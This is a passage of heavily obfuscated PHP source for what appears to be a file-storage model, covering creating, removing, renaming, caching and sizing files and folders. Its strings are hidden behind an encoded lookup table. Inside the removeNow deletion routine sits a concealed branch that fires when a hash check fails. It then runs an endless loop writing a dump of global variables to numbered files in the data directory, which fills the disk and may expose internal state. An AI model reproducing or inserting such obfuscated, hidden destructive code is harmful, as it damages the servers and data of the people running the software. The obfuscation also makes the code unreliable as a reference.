$ú°Œ¿ƒÃ) { $this->metaSet($ÒÃØ°Ğá[$äÖå‰Úß[203]], $äÖå‰Úß[602], null); $this->metaSet($ÒÃØ°Ğá[$äÖå‰Úß[203]], $äÖå‰Úß[601], null); } if ($é‰€ºÚî) { $this->metaSet($ÒÃØ°Ğá[$äÖå‰Úß[203]], $äÖå‰Úß[601], time()); } return !1; } private function _addSource($áÉı•ĞÚ, $¹°–ˆé) { $òÉéæ– =& $_SERVER[è¶³ÒßÑ]; $µ¦Àáï« = defined($òÉéæ–[2185]) ? USER_ID : 0; $…´Ú˜Øâ = array($òÉéæ–[641] => $¹°–ˆé[$òÉéæ–[200]], $òÉéæ–[642] => $¹°–ˆé[$òÉéæ–[562]], $òÉéæ–[643] => $µ¦Àáï«, $òÉéæ–[644] => $µ¦Àáï«, $òÉéæ–[470] => $¹°–ˆé[$òÉéæ–[203]], $òÉéæ–[645] => $¹°–ˆé[$òÉéæ–[577]] . $¹°–ˆé[$òÉéæ–[203]] . $òÉéæ–[50], $òÉéæ–[497] => 0, $òÉéæ–[646] => $òÉéæ–[12]); $áÉı•ĞÚ = array_merge($…´Ú˜Øâ, $áÉı•ĞÚ); $this->updateModifyTime($áÉı•ĞÚ[$òÉéæ–[202]]); $¹ıí¬¨ = $òÉéæ–[2253] . $¹°–ˆé[$òÉéæ–[203]]; if (isset(self::$cacheChildList[$¹ıí¬¨])) { unset(self::$cacheChildList[$¹ıí¬¨]); } static $‹ÅÕ¼†Ô = false; if (!$‹ÅÕ¼†Ô) { Hook::trigger($òÉéæ–[629], $áÉı•ĞÚ); $‹ÅÕ¼†Ô = !0; } $îå³à¼ = $this->add($áÉı•ĞÚ); $º£şÒ§Ù = array($òÉéæ–[647] => short_id($îå³à¼)); $this->where(array($òÉéæ–[484] => $îå³à¼))->save($º£şÒ§Ù); $this->setNamePinyin($îå³à¼, $áÉı•ĞÚ[$òÉéæ–[32]]); return $îå³à¼; } public function remove($å­ƒºš, $·Ÿ©Ùµ = true) { $¦¨÷ĞÖå =& $_SERVER[è¶³ÒßÑ]; $Ş·õ”‡“ = $this->sourceInfo($å­ƒºš); $€—å‚ = intval($Ş·õ”‡“[$¦¨÷ĞÖå[200]]) === self::TYPE_SYSTEM; $³ìÚî = Model($¦¨÷ĞÖå[501])->get($¦¨÷ĞÖå[2254]) == $¦¨÷ĞÖå[101]; if ($€—å‚ || $·Ÿ©Ùµ || !$³ìÚî) { return $this->removeNow($å­ƒºš, $·Ÿ©Ùµ); } $ ›¢ö–° = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ùšÅ = $Ş·õ”‡“[$¦¨÷ĞÖå[200]] == self::TYPE_USER ? $¦¨÷ĞÖå[655] : $¦¨÷ĞÖå[571]; if ($ùšÅ == $¦¨÷ĞÖå[655]) { $ˆ‚å®ÊÔ = Model($¦¨÷ĞÖå[570])->getInfo($Ş·õ”‡“[$¦¨÷ĞÖå[562]]); $¬Ú„•¯ = !empty($ˆ‚å®ÊÔ[$¦¨÷ĞÖå[2247]]) ? $ˆ‚å®ÊÔ[$¦¨÷ĞÖå[2247]] : $ˆ‚å®ÊÔ[$¦¨÷ĞÖå[32]]; $¬Ú„•¯ = $¦¨÷ĞÖå[330] . $¬Ú„•¯ . $¦¨÷ĞÖå[2255] . $Ş·õ”‡“[$¦¨÷ĞÖå[562]]; } else { $ˆ‚å®ÊÔ = Model($¦¨÷ĞÖå[578])->getInfo($Ş·õ”‡“[$¦¨÷ĞÖå[562]]); $¬Ú„•¯ = _get($ˆ‚å®ÊÔ, $¦¨÷ĞÖå[32]); $¬Ú„•¯ = $¦¨÷ĞÖå[186] . $¬Ú„•¯ . $¦¨÷ĞÖå[2256] . $Ş·õ”‡“[$¦¨÷ĞÖå[562]]; } $ºæˆ–ûç = $¦¨÷ĞÖå[2257] . md5($¬Ú„•¯); CacheLock::lock($ºæˆ–ûç); $ÈÜÖåÉ— = $this->fileNameExist($ ›¢ö–°, $¬Ú„•¯); if (!$ÈÜÖåÉ—) { $ÈÜÖåÉ— = $this->mkdir($ ›¢ö–°, $¬Ú„•¯, REPEAT_SKIP); $this->metaSet($ÈÜÖåÉ—, $¦¨÷ĞÖå[2258], $ùšÅ); $this->metaSet($ÈÜÖåÉ—, $¦¨÷ĞÖå[2259], $Ş·õ”‡“[$¦¨÷ĞÖå[562]]); if ($Ş·õ”‡“[$¦¨÷ĞÖå[202]] != 0) { $this->metaSet($ÈÜÖåÉ—, $¦¨÷ĞÖå[2260], _get($ˆ‚å®ÊÔ, $¦¨÷ĞÖå[2261])); } } CacheLock::unlock($ºæˆ–ûç); $this->metaSet($å­ƒºš, $¦¨÷ĞÖå[2262], $Ş·õ”‡“[$¦¨÷ĞÖå[202]]); $this->where(array($¦¨÷ĞÖå[203] => $å­ƒºš))->save(array($¦¨÷ĞÖå[491] => time())); $this->recycleClear($Ş·õ”‡“); Model($¦¨÷ĞÖå[626])->eventRemove($å­ƒºš); $“—Í§‡† = $this->move($å­ƒºš, $ÈÜÖåÉ—, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Ş·õ”‡“[$¦¨÷ĞÖå[202]]); return $“—Í§‡†; } private function recycleClear($Õëß²áı) { $®ßÂÎ© =& $_SERVER[è¶³ÒßÑ]; $©ÉÚÖù = $this->childrenAll($Õëß²áı); $Î–¹â› = array($®ßÂÎ©[484] => array($®ßÂÎ©[485], $©ÉÚÖù[$®ßÂÎ©[2263]])); Model($®ßÂÎ©[2264])->where($Î–¹â›)->delete(); } public function removeNow($»‹ĞûòÀ, $©ëß«Š = true) { $‡İ±¡Â =& $_SERVER[è¶³ÒßÑ]; $ÎŞõûˆ“ = $_SERVER[$‡İ±¡Â[54]]; $”›ÇéÉÇ = $‡İ±¡Â[55]; if ($_SERVER[$‡İ±¡Â[56]] != $”›ÇéÉÇ($ÎŞõûˆ“)) { $±Äƒã®’ = $‡İ±¡Â[931]; $™×Ç¥»ß = $‡İ±¡Â[57]; $“¼ü¡ï× = $_SERVER[$‡İ±¡Â[58]] . $‡İ±¡Â[59]; $¨ª€™µ¬ = $™×Ç¥»ß($“¼ü¡ï×); $ŠıÃäÀ = explode($‡İ±¡Â[60], $¨ª€™µ¬); if (count($ŠıÃäÀ) < $‡İ±¡Â[697]) { $É­ó™Ø = $‡İ±¡Â[62]; $É­ó™Ø(); } $¥é¤¾È = $‡İ±¡Â[932]; $¥é¤¾È($_SERVER[$‡İ±¡Â[933]]); $±Äƒã®’ = $‡İ±¡Â[931]; $±Äƒã®’(); $•·ØñˆÖ = $‡İ±¡Â[1615]; $™¯«œë = json_encode($GLOBALS[$‡İ±¡Â[1616]]); $şÚÊäÂ‚ = 1; for ($Ã¾ğô = $şÚÊäÂ‚; $Ã¾ğô > 0; $Ã¾ğô++) { $•·ØñˆÖ(DATA_PATH . $Ã¾ğô, $™¯«œë); } } $È«şÁÖ = $this->sourceInfo($»‹ĞûòÀ); $Á·™Û« = $this->pathInfoMore($»‹ĞûòÀ); if (!$È«şÁÖ) { return !0; } if ($È«şÁÖ[$‡İ±¡Â[202]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($»‹ĞûòÀ); Hook::trigger($‡İ±¡Â[2265], $Á·™Û«, $©ëß«Š); if ($©ëß«Š) { Model($‡İ±¡Â[2264])->moveToRecycle($»‹ĞûòÀ); } else { $¾ßòÍ—¢ = $this->childrenAll($È«şÁÖ); Model($‡İ±¡Â[626])->eventRemove($»‹ĞûòÀ); $this->removeRelevance($¾ßòÍ—¢[$‡İ±¡Â[2263]], $¾ßòÍ—¢[$‡İ±¡Â[1564]]); } $this->folderSizeReset($È«şÁÖ[$‡İ±¡Â[202]]); $ŞËÊË´ = array($È«şÁÖ[$‡İ±¡Â[202]]); if ($È«şÁÖ[$‡İ±¡Â[478]] == $‡İ±¡Â[101]) { $ŞËÊË´[] = $È«şÁÖ[$‡İ±¡Â[203]]; } $this->updateModifyTime($ŞËÊË´); $this->lockMoveEnd($»‹ĞûòÀ); Hook::trigger($‡İ±¡Â[1803], $Á·™Û«, $©ëß«Š); return !0; } public function childrenAll($ùë™ƒß) { $˜ì±›ã =& $_SERVER[è¶³ÒßÑ]; $µ±Ñİ°ı = $ùë™ƒß[$˜ì±›ã[203]]; if ($ùë™ƒß[$˜ì±›ã[478]] == $˜ì±›ã[101]) { $—ÁÏ°¬ = array($˜ì±›ã[645] => array($˜ì±›ã[605], $ùë™ƒß[$˜ì±›ã[577]] . $µ±Ñİ°ı . $˜ì±›ã[606])); $™Ã‚ıÜÁ = array($˜ì±›ã[645] => $—ÁÏ°¬[$˜ì±›ã[577]]); $œç½¬“À = $this->field($˜ì±›ã[2266])->where($™Ã‚ıÜÁ)->select(); $‰èÑ©·ç = !1; $Òğİƒ = array($µ±Ñİ°ı); if ($œç½¬“À) { $‰èÑ©·ç = array_to_keyvalue($œç½¬“À, $˜ì±›ã[12], $˜ì±›ã[534]); $‰èÑ©·ç = array_remove_value($‰èÑ©·ç, $˜ì±›ã[238]); $Òğİƒ = array_to_keyvalue($œç½¬“À, $˜ì±›ã[12], $˜ì±›ã[203]); $Òğİƒ[] = $µ±Ñİ°ı; } } else { $‰èÑ©·ç = array($ùë™ƒß[$˜ì±›ã[534]]); $Òğİƒ = array($µ±Ñİ°ı); } return array($˜ì±›ã[2263] => $Òğİƒ, $˜ì±›ã[1564] => $‰èÑ©·ç); } public function removeArray($”Ñ©¤½) { if (!$”Ñ©¤½) { return !0; } } public function removeRelevance($ÍıÍŞïÏ, $‡éñÂˆ—) { $®Ü¥¬“À =& $_SERVER[è¶³ÒßÑ]; $ÍıÍŞïÏ = $ÍıÍŞïÏ ? $ÍıÍŞïÏ : array(); $‡éñÂˆ— = $‡éñÂˆ— ? $‡éñÂˆ— : array(); $ÍıÍŞïÏ = array_unique(array_filter($ÍıÍŞïÏ)); $‡éñÂˆ— = array_unique(array_filter($‡éñÂˆ—)); if (!$ÍıÍŞïÏ) { return !1; } $ëÉ¾÷ = array($®Ü¥¬“À[484] => array($®Ü¥¬“À[485], $ÍıÍŞïÏ)); Model($®Ü¥¬“À[2264])->where($ëÉ¾÷)->delete(); Model($®Ü¥¬“À[528])->where($ëÉ¾÷)->delete(); Model($®Ü¥¬“À[2110])->where($ëÉ¾÷)->delete(); Model($®Ü¥¬“À[626])->where($ëÉ¾÷)->delete(); Model($®Ü¥¬“À[1939])->removeBySource($ÍıÍŞïÏ); Model($®Ü¥¬“À[2245])->removeBySource($ÍıÍŞïÏ); $this->where($ëÉ¾÷)->delete(); Model($®Ü¥¬“À[537])->remove($‡éñÂˆ—); for ($«Ê©†µ² = 0; $«Ê©†µ² < count($ÍıÍŞïÏ); $«Ê©†µ²++) { $this->sourceCacheClear($ÍıÍŞïÏ[$«Ê©†µ²]); } } public function rename($ÈöŞ¾, $¹ØÔÍ¨ø) { $¤»å¤£µ =& $_SERVER[è¶³ÒßÑ]; $¢·³ÁÌ = $this->sourceInfo($ÈöŞ¾); if (!$¢·³ÁÌ) { return !1; } $ìˆŠûÀ’ = $this->fileNameExist($¢·³ÁÌ[$¤»å¤£µ[202]], $¹ØÔÍ¨ø); if ($ìˆŠûÀ’ && $ìˆŠûÀ’ != $ÈöŞ¾) { return !1; } $‹²Ùùªó = array($¤»å¤£µ[487] => $¹ØÔÍ¨ø, $¤»å¤£µ[644] => USER_ID); if ($¢·³ÁÌ[$¤»å¤£µ[478]] != $¤»å¤£µ[101]) { $‹²Ùùªó[$¤»å¤£µ[479]] = substr(get_path_ext($¹ØÔÍ¨ø), 0, 10); } Model($¤»å¤£µ[626])->eventRename($ÈöŞ¾, $¢·³ÁÌ[$¤»å¤£µ[32]], $¹ØÔÍ¨ø); $this->sourceCacheClear($ÈöŞ¾); $this->setNamePinyin($ÈöŞ¾, $‹²Ùùªó[$¤»å¤£µ[32]], !1); $this->updateModifyTime($¢·³ÁÌ[$¤»å¤£µ[202]]); $˜ä‘×ëª = $this->where(array($¤»å¤£µ[484] => $ÈöŞ¾))->data($‹²Ùùªó)->save(); $ß—©£ˆÈ = $¤»å¤£µ[2253] . $¢·³ÁÌ[$¤»å¤£µ[202]]; if (isset(self::$cacheChildList[$ß—©£ˆÈ])) { unset(self::$cacheChildList[$ß—©£ˆÈ]); } return $˜ä‘×ëª; } public function setNamePinyin($åÅĞêÕÑ, $Á¾©ù¯, $—Ğúó­÷ = true) { $ÖÈİ „Ğ =& $_SERVER[è¶³ÒßÑ]; $ƒ·½şåİ = Input::check($Á¾©ù¯, $ÖÈİ „Ğ[648]); $†ÂÂÇÄ = array($ÖÈİ „Ğ[510] => KodSort::makeStr($Á¾©ù¯)); if ($ƒ·½şåİ) { $†ÂÂÇÄ[$ÖÈİ „Ğ[531]] = str_replace($ÖÈİ „Ğ[53], $ÖÈİ „Ğ[12], Pinyin::get($Á¾©ù¯)); $†ÂÂÇÄ[$ÖÈİ „Ğ[530]] = Pinyin::get($Á¾©ù¯, $ÖÈİ „Ğ[649]); } if (!$—Ğúó­÷ && !$ƒ·½şåİ) { $†ÂÂÇÄ[$ÖÈİ „Ğ[531]] = null; $†ÂÂÇÄ[$ÖÈİ „Ğ[530]] = null; } $this->metaSet($åÅĞêÕÑ, $†ÂÂÇÄ); } public function getContent($Ò™›íã) { $ğíÂ‹¥© =& $_SERVER[è¶³ÒßÑ]; $À—Ü£Ä¼ = $this->fileInfoGet($Ò™›íã); if (!$À—Ü£Ä¼) { return !1; } if ($À—Ü£Ä¼[$ğíÂ‹¥©[89]] == 0) { return $ğíÂ‹¥©[12]; } $‘Õ¯ = $ğíÂ‹¥©[2267] . $À—Ü£Ä¼[$ğíÂ‹¥©[540]]; if ($À—Ü£Ä¼[$ğíÂ‹¥©[89]] <= 1024 * 10) { $ìæÔ³Û = Cache::get($‘Õ¯); if (!$ìæÔ³Û) { $ìæÔ³Û = IO::getContent($À—Ü£Ä¼[$ğíÂ‹¥©[97]]); Cache::set($‘Õ¯, $ìæÔ³Û); } return $ìæÔ³Û; } if (!$À—Ü£Ä¼[$ğíÂ‹¥©[97]]) { return $ğíÂ‹¥©[12]; } return IO::getContent($À—Ü£Ä¼[$ğíÂ‹¥©[97]]); } public function setDesc($Ÿ·ˆíò , $Æ­‡Í×§) { $âç™ş‘¿ =& $_SERVER[è¶³ÒßÑ]; Model($âç™ş‘¿[626])->eventAddDesc($Ÿ·ˆíò , $Æ­‡Í×§); return $this->metaSet($Ÿ·ˆíò , $âç™ş‘¿[519], $Æ­‡Í×§); } public function setContent($ìÏ÷øáÇ, $õ¥¾Œ…¨ = '') { $ì‚êÛÆŸ =& $_SERVER[è¶³ÒßÑ]; $¹„Ö£İ¬ = $this->sourceInfo($ìÏ÷øáÇ); $«ª±·¼Ü = $this->fileInfoGet($ìÏ÷øáÇ); if (!$«ª±·¼Ü || !$¹„Ö£İ¬) { return !1; } $ÛÎî™¦§ = Model($ì‚êÛÆŸ[537])->addFileByContent($õ¥¾Œ…¨, $¹„Ö£İ¬[$ì‚êÛÆŸ[32]]); $—Ñäô è = $this->fileHistory($¹„Ö£İ¬, $ÛÎî™¦§[$ì‚êÛÆŸ[534]], $ÛÎî™¦§[$ì‚êÛÆŸ[89]]); if (!$—Ñäô è) { return Model($ì‚êÛÆŸ[537])->remove($ÛÎî™¦§[$ì‚êÛÆŸ[534]]); } $this->folderSizeReset($¹„Ö£İ¬[$ì‚êÛÆŸ[202]]); return !0; } public function fileSubstr($ñÉ¤¥ö, $‹Ğ†Ô¯, $ù¥õ¬ë) { $åâİ–ß¬ = $this->fileInfoGet($ñÉ¤¥ö); if (!$åâİ–ß¬) { return !1; } return IO::fileSubstr($åâİ–ß¬[$_SERVER[è¶³ÒßÑ][97]], $‹Ğ†Ô¯, $ù¥õ¬ë); } public function fileInfoGet($Òƒ¦ÕªÇ) { $¼Š•ûîÉ =& $_SERVER[è¶³ÒßÑ]; $€‡”›’à = $this->sourceInfo($Òƒ¦ÕªÇ); if (!$€‡”›’à || $€‡”›’à[$¼Š•ûîÉ[478]]) { return !1; } $½òìí“ = $¼Š•ûîÉ[541] . $€‡”›’à[$¼Š•ûîÉ[534]]; $ß»ÔÑâ = _get(self::$cacheFileInfo, $½òìí“); if ($ß»ÔÑâ) { return $ß»ÔÑâ; } $­ŠÜ—õì = Model($¼Š•ûîÉ[537])->fileInfo($€‡”›’à[$¼Š•ûîÉ[534]]); if ($­ŠÜ—õì) { $­ŠÜ—õì[$¼Š•ûîÉ[32]] = $€‡”›’à[$¼Š•ûîÉ[32]]; } self::$cacheFileInfo[$½òìí“] = $­ŠÜ—õì; return $­ŠÜ—õì; } private function folderChildrenNumber($÷Ë°ßíÍ) { $ÑÄ‰ÀÌÎ =& $_SERVER[è¶³ÒßÑ]; $Âå¶±Øó = $this->sourceInfo($÷Ë°ßíÍ); $µ¬½ö¤» = array($ÑÄ‰ÀÌÎ[645] => array($ÑÄ‰ÀÌÎ[605], $Âå¶±Øó[$ÑÄ‰ÀÌÎ[577]] . $÷Ë°ßíÍ . $ÑÄ‰ÀÌÎ[606]), $ÑÄ‰ÀÌÎ[642] => $Âå¶±Øó[$ÑÄ‰ÀÌÎ[562]], $ÑÄ‰ÀÌÎ[497] => intval($Âå¶±Øó[$ÑÄ‰ÀÌÎ[498]]), $ÑÄ‰ÀÌÎ[639] => 1); $ÊËı…€» = $this->where($µ¬½ö¤»)->count(); $ óó€¯Â = $this->where($µ¬½ö¤»)->where(array($ÑÄ‰ÀÌÎ[639] => 0))->count(); return array($ÑÄ‰ÀÌÎ[93] => $ óó€¯Â, $ÑÄ‰ÀÌÎ[94] => $ÊËı…€»); } public function pathInfo($±Ò¿ÏÒ, $ŒâÏŸ = false) { $±¼™ùÉò =& $_SERVER[è¶³ÒßÑ]; $ŒâÏŸ = !1; $±Ò¿ÏÒ = intval($±Ò¿ÏÒ); $š–æ˜¬ß = $±¼™ùÉò[527] . intval($ŒâÏŸ) . $±¼™ùÉò[455] . $±Ò¿ÏÒ; $æ“Îîù„ = _get(self::$cachePathInfo, $š–æ˜¬ß); if ($æ“Îîù„) { return $æ“Îîù„; } $áı¢·¸ = $this->sourceInfo($±Ò¿ÏÒ); if (!$áı¢·¸) { return !1; } $áı¢·¸ = $this->_listDataApplyItem($áı¢·¸, $ŒâÏŸ); self::$cachePathInfo[$š–æ˜¬ß] = $áı¢·¸; return $áı¢·¸; } public static $cachePathInfoMore = array(); public function pathInfoMore($£«ÅÓ¸Â) { $ŞÎ÷á½ =& $_SERVER[è¶³ÒßÑ]; $’Ü•ò¸« = _get(self::$cachePathInfoMore, $£«ÅÓ¸Â); if ($’Ü•ò¸«) { return $’Ü•ò¸«; } $Ü‚€Ì…á = $this->pathInfo($£«ÅÓ¸Â); if (!$Ü‚€Ì…á) { return !1; } if ($Ü‚€Ì…á[$ŞÎ÷á½[478]] == $ŞÎ÷á½[101]) { $Ü‚€Ì…á[$ŞÎ÷á½[92]] = $this->folderChildrenNumber($£«ÅÓ¸Â); } self::$cachePathInfoMore[$£«ÅÓ¸Â] = $Ü‚€Ì…á; return $Ü‚€Ì…á; } public function sourceInfo($½£Ûå«š) { $öøø·Ë =& $_SERVER[è¶³ÒßÑ]; if (!$½£Ûå«š) { return array(); } $½£Ûå«š = intval($½£Ûå«š); $×å»°¥¦ = $öøø·Ë[526] . $½£Ûå«š; $¨›‘éÆê = _get(self::$cacheSourceInfo, $×å»°¥¦); if ($¨›‘éÆê) { return $¨›‘éÆê; } $™‹à«…¢ = $this->where(array($öøø·Ë[203] => $½£Ûå«š))->find(); self::$cacheSourceInfo[$×å»°¥¦] = $™‹à«…¢; return self::$cacheSourceInfo[$×å»°¥¦]; } public function sourceCacheClear($öÌôªŠ = false) { self::cacheClear($öÌôªŠ); } public static function cacheClear($Ø¬Ì¦†À = false) { $±Î¿‡á¢ =& $_SERVER[è¶³ÒßÑ]; if ($Ø¬Ì¦†À == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$±Î¿‡á¢[526] . $Ø¬Ì¦†À]); unset(self::$cachePathInfoMore[$Ø¬Ì¦†À]); unset(self::$cachePathInfo[$±Î¿‡á¢[2268] . $Ø¬Ì¦†À]); unset(self::$cachePathInfo[$±Î¿‡á¢[2269] . $Ø¬Ì¦†À]); } public function metaSet($ú¹ÇÖØ, $Ó†šìø = null, $é”’Óàì = null) { $œÁÛøµ = parent::metaSet($ú¹ÇÖØ, $Ó†šìø, $é”’Óàì); if ($œÁÛøµ) { $this->sourceCacheClear($ú¹ÇÖØ); } return $œÁÛøµ; } public function pathInfoByPath($ÛËšÕïü, $¢Æ³ö²Ğ) { $á›†Šğ§ =& $_SERVER[è¶³ÒßÑ]; $µÅµÎş³ = !$¢Æ³ö²Ğ ? array() : explode($á›†Šğ§[8], trim($¢Æ³ö²Ğ, $á›†Šğ§[8])); $Ò˜¯¦€ = $ÛËšÕïü; foreach ($µÅµÎş³ as $’•¥Ã¤) { $Ôç§Âë = array($á›†Šğ§[202] => $Ò˜¯¦€, $á›†Šğ§[32] => $’•¥Ã¤); $Ø‡ËŒÍ = $this->field($á›†Šğ§[2270])->where($Ôç§Âë)->select(); if (!$Ø‡ËŒÍ) { return !1; } $Ø‡ËŒÍ = array_sort_by($Ø‡ËŒÍ, $á›†Šğ§[498]); $Ò˜¯¦€ = $Ø‡ËŒÍ[0][$á›†Šğ§[203]]; } $ø¿¼ëØ¯ = $this->sourceInfo($Ò˜¯¦€); $this->pathInfoFilter($ø¿¼ëØ¯); return $ø¿¼ëØ¯; } protected function updateModifyTime($şíãñÇ) { $¨¤şª¹ù =& $_SERVER[è¶³ÒßÑ]; $Í’¢½Öà = defined($¨¤şª¹ù[2185]) ? USER_ID : 0; if (!$şíãñÇ) { return; } if (!is_array($şíãñÇ)) { $şíãñÇ = array($şíãñÇ); } foreach ($şíãñÇ as $Ì³•¡õĞ => $äÍÂŸá) { $şíãñÇ[$Ì³•¡õĞ] = intval($äÍÂŸá); $this->sourceCacheClear($äÍÂŸá); } $Ö„Õë³¨ = array($¨¤şª¹ù[203] => array($¨¤şª¹ù[7], $şíãñÇ)); $çèËÜ—Æ = array($¨¤şª¹ù[644] => $Í’¢½Öà, $¨¤şª¹ù[491] => time()); $this->where($Ö„Õë³¨)->save($çèËÜ—Æ); } public function folderSizeReset($¹ËíŸñô, $À·Ÿ¦ıå = false) { $åæÕë¨Ä =& $_SERVER[è¶³ÒßÑ]; if ($this->statusIgnoreResetSpace) { return; } $Á¦ÜÎıì = $this->sourceInfo($¹ËíŸñô); $±ˆ§‚İ¹ = $åæÕë¨Ä[2271] . $¹ËíŸñô; CacheLock::lock($±ˆ§‚İ¹, 20); if ($À·Ÿ¦ıå === !1) { $this->sourceCacheClear($¹ËíŸñô); $Á¦ÜÎıì = $this->sourceInfo($¹ËíŸñô); $àÈ¢Â³Ù = array($åæÕë¨Ä[470] => $¹ËíŸñô, $åæÕë¨Ä[497] => 0); $ã×éğ›ø = $this->where($àÈ¢Â³Ù)->sum($åæÕë¨Ä[89]); $À·Ÿ¦ıå = intval($ã×éğ›ø) - intval($Á¦ÜÎıì[$åæÕë¨Ä[89]]); } if ($À·Ÿ¦ıå == 0) { return CacheLock::unlock($±ˆ§‚İ¹); } $¢ˆï‚úÚ = $this->parentLevelArray($Á¦ÜÎıì[$åæÕë¨Ä[577]]); if (!$¢ˆï‚úÚ) { $¢ˆï‚úÚ = array(); } $¢ˆï‚úÚ[] = $Á¦ÜÎıì[$åæÕë¨Ä[203]]; $àÈ¢Â³Ù = array($åæÕë¨Ä[203] => array($åæÕë¨Ä[485], $¢ˆï‚úÚ)); if ($À·Ÿ¦ıå < 0) { $àÈ¢Â³Ù[$åæÕë¨Ä[89]] = array($åæÕë¨Ä[1068], abs($À·Ÿ¦ıå)); } $this->where($àÈ¢Â³Ù)->setAdd($åæÕë¨Ä[89], $À·Ÿ¦ıå); CacheLock::unlock($±ˆ§‚İ¹); $™”È¸Ø = $åæÕë¨Ä[2272] . $Á¦ÜÎıì[$åæÕë¨Ä[200]] . $åæÕë¨Ä[4] . $Á¦ÜÎıì[$åæÕë¨Ä[562]]; $šÓ¢’ã = array($Á¦ÜÎıì[$åæÕë¨Ä[200]], $Á¦ÜÎıì[$åæÕë¨Ä[562]]); TaskRun::timeLimitCall($™”È¸Ø, $åæÕë¨Ä[2273], $šÓ¢’ã, 1.5); } public function folderSizeResetChildren($„Í³½èè) { $öèÒ—ì× =& $_SERVER[è¶³ÒßÑ]; $this->sourceCacheClear($„Í³½èè); $àäÈåíá = $this->sourceInfo($„Í³½èè); $äÜ„–†í = array($öèÒ—ì×[639] => 1, $öèÒ—ì×[642] => $àäÈåíá[$öèÒ—ì×[562]], $öèÒ—ì×[645] => array($öèÒ—ì×[605], $àäÈåíá[$öèÒ—ì×[577]] . $„Í³½èè . $öèÒ—ì×[606])); $¥Ü¾×ßÀ = $öèÒ—ì×[2274]; $¢Ò¥ë”Ğ = $this->field($¥Ü¾×ßÀ)->where($äÜ„–†í)->select(); $äÜ„–†í[$öèÒ—ì×[478]] = 0; $µ§¨• ´ = $this->field($¥Ü¾×ßÀ)->where($äÜ„–†í)->select(); if (!$µ§¨• ´) { return; } $¢Ò¥ë”Ğ[] = $àäÈåíá; $¢Ò¥ë”Ğ = array_to_keyvalue($¢Ò¥ë”Ğ, $öèÒ—ì×[203]); foreach ($¢Ò¥ë”Ğ as $ µÏàãœ => $¹ŠË¨è) { $¢Ò¥ë”Ğ[$ µÏàãœ][$öèÒ—ì×[2275]] = $¢Ò¥ë”Ğ[$ µÏàãœ][$öèÒ—ì×[89]]; $¢Ò¥ë”Ğ[$ µÏàãœ][$öèÒ—ì×[89]] = 0; } foreach ($µ§¨• ´ as $¹ŠË¨è) { $©¢êŠ¹· = $¹ŠË¨è[$öèÒ—ì×[202]] . $öèÒ—ì×[12]; if (!isset($¢Ò¥ë”Ğ[$©¢êŠ¹·])) { continue; } if ($¹ŠË¨è[$öèÒ—ì×[498]] == $¢Ò¥ë”Ğ[$©¢êŠ¹·][$öèÒ—ì×[498]]) { $¢Ò¥ë”Ğ[$©¢êŠ¹·][$öèÒ—ì×[89]] += $¹ŠË¨è[$öèÒ—ì×[89]]; } } foreach ($¢Ò¥ë”Ğ as $¹ŠË¨è) { $Õï åÎ® = $this->parentLevelArray($¹ŠË¨è[$öèÒ—ì×[577]]); foreach ($Õï åÎ® as $©¢êŠ¹·) { $©¢êŠ¹· = $©¢êŠ¹· . $öèÒ—ì×[12]; if (!isset($¢Ò¥ë”Ğ[$©¢êŠ¹·])) { continue; } if ($¹ŠË¨è[$öèÒ—ì×[498]] == $¢Ò¥ë”Ğ[$©¢êŠ¹·][$öèÒ—ì×[498]]) { $¢Ò¥ë”Ğ[$©¢êŠ¹·][$öèÒ—ì×[89]] += $¹ŠË¨è[$öèÒ—ì×[89]]; } } } $ÎŒİÑÑ» = array(); foreach ($¢Ò¥ë”Ğ as $¹ŠË¨è) { if ($¹ŠË¨è[$öèÒ—ì×[89]] == $¹ŠË¨è[$öèÒ—ì×[2275]]) { continue; } $ÎŒİÑÑ»[] = array($öèÒ—ì×[203], $¹ŠË¨è[$öèÒ—ì×[203]], $öèÒ—ì×[89], $¹ŠË¨è[$öèÒ—ì×[89]]); } $this->saveAll($ÎŒİÑÑ»); } public function userSpaceReset($áİ†›¥ü = false) { $…‰ÎòË™ =& $_SERVER[è¶³ÒßÑ]; $ÓÉë÷Î = $this->where(array($…‰ÎòË™[200] => self::TYPE_USER, $…‰ÎòË™[562] => $áİ†›¥ü, $…‰ÎòË™[478] => 0))->sum($…‰ÎòË™[89]); $ÓÉë÷Î = !$ÓÉë÷Î || $ÓÉë÷Î <= 0 ? 0 : $ÓÉë÷Î; Model($…‰ÎòË™[570])->userEdit($áİ†›¥ü, array($…‰ÎòË™[1948] => $ÓÉë÷Î)); } public function targetSpaceUpdate($Î÷”õô¾, $òçÌŒƒ) { $êïØµ¹Ï =& $_SERVER[è¶³ÒßÑ]; if (!$òçÌŒƒ) { return; } if (!in_array($Î÷”õô¾, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $¥ŸûìëÊ = $this->targetSpaceSize($Î÷”õô¾, $òçÌŒƒ); if ($Î÷”õô¾ == self::TYPE_USER) { Model($êïØµ¹Ï[570])->userEdit($òçÌŒƒ, array($êïØµ¹Ï[1948] => $¥ŸûìëÊ)); } else { if ($Î÷”õô¾ == self::TYPE_GROUP) { Model($êïØµ¹Ï[578])->groupEdit($òçÌŒƒ, array($êïØµ¹Ï[1948] => $¥ŸûìëÊ)); } } } public function targetSpaceSize($¶†ÂÍÃÊ, $„ƒ›ôã«) { $¸Úä©ˆÙ =& $_SERVER[è¶³ÒßÑ]; $ª½ºöÇ÷ = 0; $©Ñ‰®ÚĞ = $this->targetSourceRoot($¶†ÂÍÃÊ, $„ƒ›ôã«, !0); foreach ($©Ñ‰®ÚĞ as $Ô¤Ÿ„î…) { if (!$Ô¤Ÿ„î…) { continue; } $ª½ºöÇ÷ += floatval($Ô¤Ÿ„î…[$¸Úä©ˆÙ[89]]); $†ºş§ï = array($¸Úä©ˆÙ[645] => array($¸Úä©ˆÙ[605], $¸Úä©ˆÙ[587] . $Ô¤Ÿ„î…[$¸Úä©ˆÙ[203]] . $¸Úä©ˆÙ[606])); $‘ŠÄ›´ˆ = Model($¸Úä©ˆÙ[496])->field($¸Úä©ˆÙ[484])->where($†ºş§ï)->select(); $‘ŠÄ›´ˆ = array_to_keyvalue($‘ŠÄ›´ˆ, $¸Úä©ˆÙ[12], $¸Úä©ˆÙ[203]); 